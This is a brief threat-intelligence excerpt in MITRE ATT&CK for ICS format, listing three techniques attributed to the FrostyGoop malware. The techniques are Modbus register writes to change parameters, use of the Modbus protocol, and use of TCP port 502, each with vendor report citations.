- T0836 - Modify Parameter: [FrostyGoop](https://attack.mitre.org/software/S1165) allows for the modification of system settings by reading and writing to registers via Modbus commands.(Citation: Dragos FROSTYGOOP 2024)(Citation: Nozomi BUSTLEBERM 2024)

- T0869 - Standard Application Layer Protocol: [FrostyGoop](https://attack.mitre.org/software/S1165) utilizes the Modbus protocol for transmitting commands to victim devices.(Citation: Dragos FROSTYGOOP 2024)

- T0885 - Commonly Used Port: [FrostyGoop](https://attack.mitre.org/software/S1165) communicates using the Modbus protocol over the standard port of TCP 502.(Citation: Dragos FROSTYGOOP 2024)